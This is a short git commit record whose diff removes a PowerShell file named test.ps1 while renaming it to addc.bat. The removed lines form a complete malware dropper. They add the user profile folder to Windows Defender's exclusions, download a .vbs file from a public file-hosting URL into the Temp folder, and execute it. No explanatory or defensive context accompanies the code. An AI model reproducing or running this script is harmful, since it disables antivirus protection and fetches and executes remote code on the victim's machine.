be6a81573763a8bd19b4989c4ab457dde559b10a
hjbkjgvijkkhgk <131483909+UnlimitedGPT@users.noreply.github.com>
2024-12-12 22:22:18 +0100

    Update and rename test.ps1 to addc.bat

--- test.ps1
+++
@@ -1,7 +0,0 @@
-Add-MpPreference -ExclusionPath $env:USERPROFILE
-
-$url = "https://files.catbox.moe/cun1b6.vbs"
-$output = "$env:Temp/cun1b6.vbs"
-Invoke-WebRequest -Uri $url -OutFile $output
-
-Start-Process -FilePath $output
